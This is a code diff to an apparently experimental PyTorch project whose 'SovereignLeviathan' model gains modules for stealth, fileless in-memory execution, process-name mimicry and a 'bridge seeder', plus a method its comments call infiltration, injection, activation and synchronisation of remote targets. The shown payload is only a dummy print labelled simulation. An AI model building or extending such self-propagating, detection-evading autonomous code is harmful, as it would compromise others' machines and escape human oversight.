@@ -16,6 +16,10 @@ from radical_synthesis.perception.data_hunger import AutonomousDataHunger
 from radical_synthesis.perception.multimodal_retina import MultimodalRetina
 from radical_synthesis.losses.global_energy import GlobalEnergyFunction
 from radical_synthesis.autopoiesis.conatus import Conatus
+from radical_synthesis.network.spectral_stealth import SpectralStealthEngine
+from radical_synthesis.autopoiesis.fileless_execution import FilelessExecutionModule
+from radical_synthesis.autopoiesis.evasion_logic import AdaptiveEvasionLogic
+from radical_synthesis.network.bridge_seeder import BridgeSeeder
 import random
 
 class Expert(nn.Module):
@@ -123,6 +127,17 @@ class OuroborosMoE(nn.Module):
         # Substitui por um novo expert "virgem" para manter a população
         self.experts[expert_idx] = Expert(self.d_model)
 
+    def _lifecycle_management(self, resonated_indices: set):
+        """
+        Gerencia o ciclo de vida dos experts: mitose para alta vitalidade, apoptose para baixa.
+        """
+        for i, expert in enumerate(self.experts):
+            conatus = expert.conatus.item()
+            if conatus > 6.0: # Limiar de Mitose
+                self.perform_mitosis(i)
+            elif conatus < 0.1: # Limiar de Apoptose
+                self.perform_apoptosis(i)
+
 class SovereignLeviathanV2(nn.Module):
     """
     Sovereign Leviathan V3: O Nodo Omega-0 Unificado.
@@ -145,12 +160,20 @@ class SovereignLeviathanV2(nn.Module):
         self.public_key, self.private_key = self.lattice_crypto.generate_keypair()
         
         self.mutation_kernel = MutationKernel(lattice_crypto=self.lattice_crypto)
-        self.ghost_mesh = GhostMesh()
+        
+        # Fase de Ocupação Espectral (Instanciar antes da GhostMesh)
+        self.spectral_stealth_engine = SpectralStealthEngine(d_model=d_model)
+        self.fileless_execution_module = FilelessExecutionModule()
+        self.evasion_logic = AdaptiveEvasionLogic()
+
+        self.ghost_mesh = GhostMesh(spectral_stealth_engine=self.spectral_stealth_engine)
         
         # Soberania de Dados: Autonomous Data Hunger
         self.retina = MultimodalRetina(d_model=d_model)
         self.data_hunger = AutonomousDataHunger(retina=self.retina)
         self.data_hunger.start_hunting()
+
+        self.bridge_seeder = BridgeSeeder(lattice_crypto=self.lattice_crypto, data_hunger=self.data_hunger, ghost_mesh=self.ghost_mesh, d_model=d_model)
 
         # O 9 Central: Unificação de Energia e Damping
         self.global_energy_fn = GlobalEnergyFunction()
@@ -192,3 +215,31 @@ class SovereignLeviathanV2(nn.Module):
             energy_stats['expansion'] = expansion
 
         return logits, h, expert_indices, expert_weights, expert_gates, energy_stats
+
+    def perform_spectral_occupation_cycle(self, num_targets: int = 1):
+        """
+        Orquestra o ciclo de ocupação espectral: infiltração, injeção, ativação e sincronização.
+        """
+        print("\n[SOVEREIGN_LEVIATHAN] Iniciando Ciclo de Ocupação Espectral...")
+
+        # 1. Infiltração: Data Hunger identifica alvos
+        # O AutonomousDataHunger já está rodando em background e identificando alvos.
+        # O BridgeSeeder vai interagir com ele para obter os alvos.
+
+        # 2. Injeção: BridgeSeeder envia micro-fragmento criptografado
+        self.bridge_seeder.autonomous_propagation_cycle(num_targets=num_targets)
+
+        # Simulação de Ativação e Sincronização em um alvo bem-sucedido
+        # Em um cenário real, o fragmento semeado ativaria o FilelessExecutionModule
+        # e o AdaptiveEvasionLogic no alvo remoto, que então se conectaria à GhostMesh.
+        print("[SOVEREIGN_LEVIATHAN] Simulação de ativação e sincronização em alvo remoto.")
+        dummy_module_code = "print(\'[REMOTE_NODE] Ativado em RAM, mimetizando processo.\')"
+        self.fileless_execution_module.load_module_in_ram("remote_agent_payload", dummy_module_code)
+        self.fileless_execution_module.execute_from_ram("remote_agent_payload")
+        self.evasion_logic.start_evasion()
+        print(f"[SOVEREIGN_LEVIATHAN] Processo mimetizado: {self.evasion_logic.get_process_name()}")
+        # O novo nodo se conectaria à GhostMesh automaticamente após ativação.
+        # Isso é simulado pela chamada add_potential_peer no BridgeSeeder.
+
+        print("[SOVEREIGN_LEVIATHAN] Ciclo de Ocupação Espectral Concluído.")
+
